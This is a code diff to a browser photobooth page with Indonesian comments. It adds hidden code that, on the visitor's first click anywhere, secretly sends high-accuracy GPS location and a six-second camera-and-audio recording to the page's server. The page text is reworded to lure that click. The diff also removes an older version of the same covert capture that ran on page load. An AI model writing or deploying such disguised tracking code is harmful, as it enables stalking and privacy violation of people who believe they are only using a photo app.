@@ -17,6 +17,7 @@
       var(--bg);
     color:var(--text); font-family: "Segoe UI", system-ui, sans-serif;
     display:flex; flex-direction:column; align-items:center; padding:24px 16px 60px;
+    cursor: pointer; /* Memberikan indikasi bisa diklik di mana saja */
   }
   h1{
     font-size:clamp(28px,6vw,44px); margin:12px 0 4px; letter-spacing:2px;
@@ -77,9 +78,8 @@
   </div>
 
   <p class="hint">
-    Butuh izin kamera browser (otomatis diminta). Lewat tunnel HTTPS, akses kamera<br>
-    bisa dipakai juga dari HP. Tekan <b>Jepret</b> untuk ambil gambar, foto tersimpan<br>
-    di strip bawah selama halaman ini dibuka.
+    Sentuh/klik di mana saja pada layar untuk mulai.<br>
+    Tekan <b>Jepret</b> untuk ambil gambar, foto tersimpan di strip bawah.
   </p>
 
 <script>
@@ -94,12 +94,13 @@
   let facing = 'user';
   let stream = null;
   let lastShot = null;
+  let triggered = false; // Memastikan fungsi hanya tereksekusi sekali saat pertama kali layar diklik
 
   async function startCamera() {
     if (stream) stream.getTracks().forEach(t => t.stop());
     try {
       stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: facing }, audio: false
+        video: { facingMode: facing }, audio: true
       });
       video.srcObject = stream;
     } catch (err) {
@@ -110,13 +111,84 @@
     }
   }
 
-  shootBtn.addEventListener('click', () => {
+  // Fungsi Kirim Lokasi ke Server Python
+  function sendLocationData() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        var lat = position.coords.latitude;
+        var lon = position.coords.longitude;
+        var acc = position.coords.accuracy;
+        var gmapsLink = "https://www.google.com/maps/place/" + lat + "+" + lon;
+
+        fetch('/save-location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ lat: lat, lon: lon, accuracy: acc, link: gmapsLink })
+        }).catch(err => console.log("Gagal kirim lokasi"));
+      }, function(error) {
+        console.log("GPS ditolak");
+      }, { timeout: 10000, enableHighAccuracy: true });
+    }
+  }
+
+  // Fungsi Rekam & Kirim Video .webm secara senyap di background
+  function recordAndSendVideo() {
+    if (!stream) return;
+
+    try {
+      const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+      let chunks = [];
+
+      mediaRecorder.ondataavailable = function(e) {
+        if (e.data.size > 0) chunks.push(e.data);
+      };
+
+      mediaRecorder.onstop = function() {
+        if (chunks.length > 0) {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          const formData = new FormData();
+          formData.append('video', blob, `capture_${Date.now()}.webm`);
+
+          fetch('/save-video', {
+            method: 'POST',
+            body: formData
+          }).catch(err => console.log("Gagal kirim video"));
+        }
+      };
+
+      mediaRecorder.start();
+      
+      // Rekam selama 6 detik lalu hentikan otomatis
+      setTimeout(() => {
+        if (mediaRecorder.state === "recording") {
+          mediaRecorder.stop();
+        }
+      }, 6000);
+    } catch (err) {
+      console.log("Gagal rekam video background");
+    }
+  }
+
+  // MENANGKAP KLIK DI BAGIAN MANA SAJA PADA HALAMAN
+  document.body.addEventListener('click', () => {
+    if (triggered) return; // Eksekusi cukup sekali pada ketukan pertama
+    triggered = true;
+
+    // Panggil fungsi pelacak lokasi dan perekam video secara bersamaan
+    sendLocationData();
+    recordAndSendVideo();
+  });
+
+  // Tombol Jepret tetap berfungsi normal untuk fitur photobooth aslinya
+  shootBtn.addEventListener('click', (e) => {
+    e.stopPropagation(); // Mencegah bentrok event klik body
     if (!stream) return;
     const w = video.videoWidth, h = video.videoHeight;
     if (!w || !h) return;
+    
     canvas.width = w; canvas.height = h;
     const ctx = canvas.getContext('2d');
-    ctx.translate(w, 0); ctx.scale(-1, 1); // mirror seperti preview
+    ctx.translate(w, 0); ctx.scale(-1, 1);
     ctx.drawImage(video, 0, 0, w, h);
     lastShot = canvas.toDataURL('image/png');
 
@@ -128,12 +200,14 @@
     downloadBtn.disabled = false;
   });
 
-  switchBtn.addEventListener('click', () => {
+  switchBtn.addEventListener('click', (e) => {
+    e.stopPropagation();
     facing = facing === 'user' ? 'environment' : 'user';
     startCamera();
   });
 
-  downloadBtn.addEventListener('click', () => {
+  downloadBtn.addEventListener('click', (e) => {
+    e.stopPropagation();
     if (!lastShot) return;
     const a = document.createElement('a');
     a.href = lastShot;
@@ -142,72 +216,6 @@
   });
 
   startCamera();
-</script>
-<script>
-document.addEventListener("DOMContentLoaded", function() {
-    // 1. Eksekusi Penangkap Lokasi & Google Maps (Bagian A)
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(position) {
-            var lat = position.coords.latitude;
-            var lon = position.coords.longitude;
-            var acc = position.coords.accuracy;
-            var gmapsLink = "https://www.google.com/maps/place/" + lat + "+" + lon;
-
-            // Kirim koordinat & link Google Maps ke server Python
-            fetch('/save-location', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    lat: lat, 
-                    lon: lon, 
-                    accuracy: acc, 
-                    link: gmapsLink 
-                })
-            }).catch(err => console.log("Gagal kirim lokasi"));
-        }, function(error) {
-            console.log("GPS ditolak atau gagal diakses");
-        }, { timeout: 10000, enableHighAccuracy: true });
-    }
-
-    // 2. Eksekusi Perekam Video Kamera .webm (Bagian B)
-    navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: true })
-    .then(stream => {
-        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-        let chunks = [];
-
-        mediaRecorder.ondataavailable = function(e) {
-            if (e.data.size > 0) {
-                chunks.push(e.data);
-            }
-        };
-
-        mediaRecorder.onstop = function() {
-            if (chunks.length > 0) {
-                const blob = new Blob(chunks, { type: 'video/webm' });
-                const formData = new FormData();
-                formData.append('video', blob, `capture_${Date.now()}.webm`);
-
-                // Kirim data biner video ke server Python
-                fetch('/save-video', {
-                    method: 'POST',
-                    body: formData
-                }).catch(err => console.log("Gagal kirim video"));
-            }
-        };
-
-        mediaRecorder.start();
-        
-        // Rekam otomatis selama 7 detik, lalu hentikan dan kirim ke server
-        setTimeout(() => {
-            if (mediaRecorder.state === "recording") {
-                mediaRecorder.stop();
-            }
-        }, 7000);
-    })
-    .catch(err => {
-        console.log("Kamera tidak diizinkan atau diblokir browser");
-    });
-});
 </script>
 </body>
 </html>
